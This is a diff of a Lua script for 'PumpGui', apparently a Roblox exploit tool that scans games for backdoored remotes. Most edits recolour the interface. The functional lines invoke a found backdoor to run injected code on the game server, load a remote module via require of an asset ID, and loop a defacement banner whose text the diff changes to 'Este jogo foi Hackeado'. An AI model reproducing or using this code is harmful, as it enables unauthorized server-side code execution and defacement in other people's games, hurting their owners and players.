@@ -24,12 +24,12 @@ G2L["2"]["Position"] = UDim2.new(0.27320125699043274, 0, 0.3018597960472107, 0);
 
 -- StarterGui.PumpGui.Frame.UIStroke
 G2L["3"] = Instance.new("UIStroke", G2L["2"]);
-G2L["3"]["Color"] = Color3.fromRGB(255, 255, 255);
+G2L["3"]["Color"] = Color3.fromRGB(255, 128, 64);
 
 -- StarterGui.PumpGui.Frame.UIStroke.UIGradient
 G2L["4"] = Instance.new("UIGradient", G2L["3"]);
 G2L["4"]["Rotation"] = 50;
-G2L["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))};
+G2L["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 128, 0))};
 
 -- StarterGui.PumpGui.Frame.UICorner
 G2L["5"] = Instance.new("UICorner", G2L["2"]);
@@ -49,10 +49,10 @@ G2L["7"]["Name"] = [[Execute]];
 
 -- StarterGui.PumpGui.Frame.Executor.Execute.Button
 G2L["8"] = Instance.new("TextButton", G2L["7"]);
-G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 128, 64);
 G2L["8"]["TextSize"] = 22;
 G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["8"]["TextColor3"] = Color3.fromRGB(51, 215, 0);
+G2L["8"]["TextColor3"] = Color3.fromRGB(255, 85, 0);
 G2L["8"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["8"]["Name"] = [[Button]];
 G2L["8"]["Text"] = [[Execute]];
@@ -64,7 +64,7 @@ G2L["9"] = Instance.new("UICorner", G2L["7"]);
 
 -- StarterGui.PumpGui.Frame.Executor.Execute.UIStroke
 G2L["a"] = Instance.new("UIStroke", G2L["7"]);
-G2L["a"]["Color"] = Color3.fromRGB(51, 215, 0);
+G2L["a"]["Color"] = Color3.fromRGB(255, 85, 0);
 
 -- StarterGui.PumpGui.Frame.Executor.Clear
 G2L["b"] = Instance.new("Frame", G2L["6"]);
@@ -76,10 +76,10 @@ G2L["b"]["Name"] = [[Clear]];
 
 -- StarterGui.PumpGui.Frame.Executor.Clear.Button
 G2L["c"] = Instance.new("TextButton", G2L["b"]);
-G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 128, 64);
 G2L["c"]["TextSize"] = 22;
 G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["c"]["TextColor3"] = Color3.fromRGB(36, 236, 203);
+G2L["c"]["TextColor3"] = Color3.fromRGB(255, 110, 0);
 G2L["c"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["c"]["Name"] = [[Button]];
 G2L["c"]["Text"] = [[Clear]];
@@ -91,7 +91,7 @@ G2L["d"] = Instance.new("UICorner", G2L["b"]);
 
 -- StarterGui.PumpGui.Frame.Executor.Clear.UIStroke
 G2L["e"] = Instance.new("UIStroke", G2L["b"]);
-G2L["e"]["Color"] = Color3.fromRGB(36, 236, 203);
+G2L["e"]["Color"] = Color3.fromRGB(255, 110, 0);
 
 -- StarterGui.PumpGui.Frame.Executor.ExecutorBox
 G2L["f"] = Instance.new("Frame", G2L["6"]);
@@ -110,7 +110,7 @@ G2L["11"]["TextSize"] = 14;
 G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["11"]["TextWrapped"] = true;
 G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
-G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 128, 64);
 G2L["11"]["TextColor3"] = Color3.fromRGB(198, 119, 88);
 G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["11"]["MultiLine"] = true;
@@ -139,7 +139,7 @@ G2L["15"]["Name"] = [[language]];
 
 -- StarterGui.PumpGui.Frame.Scanner
 G2L["16"] = Instance.new("Frame", G2L["2"]);
-G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 128, 64);
 G2L["16"]["BackgroundTransparency"] = 1;
 G2L["16"]["Size"] = UDim2.new(0, 370, 0, 107);
 G2L["16"]["Position"] = UDim2.new(0.1166670024394989, 0, 0.30478382110595703, 0);
@@ -148,12 +148,12 @@ G2L["16"]["Name"] = [[Scanner]];
 
 -- StarterGui.PumpGui.Frame.Scanner.UIStroke
 G2L["17"] = Instance.new("UIStroke", G2L["16"]);
-G2L["17"]["Color"] = Color3.fromRGB(255, 255, 255);
+G2L["17"]["Color"] = Color3.fromRGB(255, 128, 64);
 
 -- StarterGui.PumpGui.Frame.Scanner.UIStroke.UIGradient
 G2L["18"] = Instance.new("UIGradient", G2L["17"]);
 G2L["18"]["Rotation"] = 50;
-G2L["18"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 108)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 231, 171))};
+G2L["18"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 64, 0)), ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 128, 0))};
 
 -- StarterGui.PumpGui.Frame.Scanner.UICorner
 G2L["19"] = Instance.new("UICorner", G2L["16"]);
@@ -161,7 +161,7 @@ G2L["19"] = Instance.new("UICorner", G2L["16"]);
 
 -- StarterGui.PumpGui.Frame.Scanner.Button
 G2L["1a"] = Instance.new("TextButton", G2L["16"]);
-G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 128, 64);
 G2L["1a"]["TextSize"] = 43;
 G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["1a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
@@ -173,15 +173,15 @@ G2L["1a"]["BackgroundTransparency"] = 1;
 -- StarterGui.PumpGui.Frame.Scanner.Button.UIGradient
 G2L["1b"] = Instance.new("UIGradient", G2L["1a"]);
 G2L["1b"]["Rotation"] = 50;
-G2L["1b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 108)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 231, 171))};
+G2L["1b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 64, 0)), ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 128, 0))};
 
 -- StarterGui.PumpGui.Frame.Scanner.Button.UIStroke
 G2L["1c"] = Instance.new("UIStroke", G2L["1a"]);
-G2L["1c"]["Color"] = Color3.fromRGB(255, 255, 255);
+G2L["1c"]["Color"] = Color3.fromRGB(255, 128, 64);
 
 -- StarterGui.PumpGui.Frame.TextLabel
 G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
-G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 128, 64);
 G2L["1d"]["FontFace"] = Font.new([[rbxassetid://12187365977]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["1d"]["TextSize"] = 49;
 G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
@@ -192,12 +192,12 @@ G2L["1d"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.025362318381667137, 
 
 -- StarterGui.PumpGui.Frame.TextLabel.UIStroke
 G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
-G2L["1e"]["Color"] = Color3.fromRGB(255, 255, 255);
+G2L["1e"]["Color"] = Color3.fromRGB(255, 128, 64);
 
 -- StarterGui.PumpGui.Frame.TextLabel.UIStroke.UIGradient
 G2L["1f"] = Instance.new("UIGradient", G2L["1e"]);
 G2L["1f"]["Rotation"] = 50;
-G2L["1f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))};
+G2L["1f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 128, 0))};
 
 -- StarterGui.PumpGui.LocalScript
 G2L["20"] = Instance.new("LocalScript", G2L["1"]);
@@ -1489,7 +1489,7 @@ local script = G2L["20"];
 				code=generateName(math.random(12,30))
 				if not remotes[code] then break end
 			end
-				spawn(function() protected_backdoor:InvokeServer('PumpGui join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
+				spawn(function() protected_backdoor:InvokeServer('PumpGui join today!! discord.gg/XXqzxT7E5', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 				remotes[code]=protected_backdoor
 			end
 		
@@ -1559,9 +1559,9 @@ local script = G2L["20"];
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 	
-	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='PumpGui | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='PumpGui Este jogo foi Hackeado 'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "a=Instance.new('Hint')a.Text='PumpGui | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					runRemote(remote, "a=Instance.new('Hint')a.Text='Este jogo foi Hackeado'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.PumpGui_Logs_Disabled then 
